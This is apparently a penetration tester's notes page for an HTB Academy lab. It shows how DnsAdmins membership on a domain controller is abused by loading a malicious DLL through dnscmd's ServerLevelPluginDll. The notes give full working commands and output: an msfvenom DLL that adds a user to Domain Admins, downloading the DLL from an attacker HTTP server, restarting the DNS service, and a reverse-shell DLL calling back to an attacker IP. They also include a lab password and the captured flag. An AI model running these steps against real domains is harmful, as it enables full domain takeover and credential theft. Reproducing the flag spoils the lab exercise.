# DnsAdmins

this group have access to DNS information on the network and since the DNS service runs as `NT AUTHORITY\SYSTEM` we could potentially escalate privilege on DC.

the following attack can be performed when DNS is run on a Domain Controller (which is very common):

* DNS management is performed over RPC
* [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with **zero verification** of the DLL's path. This can be done with the `dnscmd` tool from the command line
* When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
* When the DNS service is restarted, the **DLL in this path will be loaded** (i.e., a network share that the Domain Controller's machine account can access)
* An **attacker can load a custom DLL to obtain a reverse shell** or even load a tool such as Mimikatz as a DLL to dump credentials.

### Leveraging DnsAdmins Access

**Generating Malicious DLL**

to add a user to the `domain admins` group using `msfvenom`.

```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

**Starting Local HTTP Server**

```shell-session
carbonlky@htb[/htb]$ python3 -m http.server 7777
```

**Downloading File to Target**

```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

**Loading DLL as Non-Privileged User (Will ERROR)**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

**Loading DLL as Member of DnsAdmins**

```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
```

**Loading Custom DLL**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

{% hint style="info" %}
specify the full path to our custom DLL or the attack will not work properly.
{% endhint %}

**Finding User's SID**

```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

**Checking Permissions on DNS Service**

```cmd-session
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

user has `RPWP` permissions -> `SERVICE_START` and `SERVICE_STOP`

**Stopping the DNS Service**

```cmd-session
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

**Starting the DNS Service**

```cmd-session
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

**Confirming Group Membership**

```cmd-session
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

## Clean up

**Confirming Registry Key Added**

```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

**Deleting Registry Key**

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**Starting the DNS Service**

```cmd-session
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

## Mimilib.dll

{% embed url="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" %}
Follow this blog to use the dns privilege and get reverse shell
{% endembed %}

Or the following blog to get a reverse shell as NT AUTHORITY/SYSTEM on a DC

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" %}
DNSAdmin to DomainAdmin
{% endembed %}

## Assessement

**Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt**

1. Create Reverse shell payload for DLL

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=7890 -f dll -o script.dll        
```

2. Move file to the target

* I personally mounted the drive to the xfreerdp session

```
xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! /drive:/home/kali/Desktop/htb_academy/privesc_windows
```

3. Upload the reverse shell as plugin

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\script.dll
```

4. Stop and Start the dns service

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption><p>MAKE SURE TO RUN SC.EXE NOT SC IF USING POWERSHELL!!</p></figcaption></figure>

5. Listen to the incomming request and get the reverse shell as NT AUTHORITY/SYSTEM

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption><p>Privilege escalated</p></figcaption></figure>

* **Dll\_abus3\_ftw!**
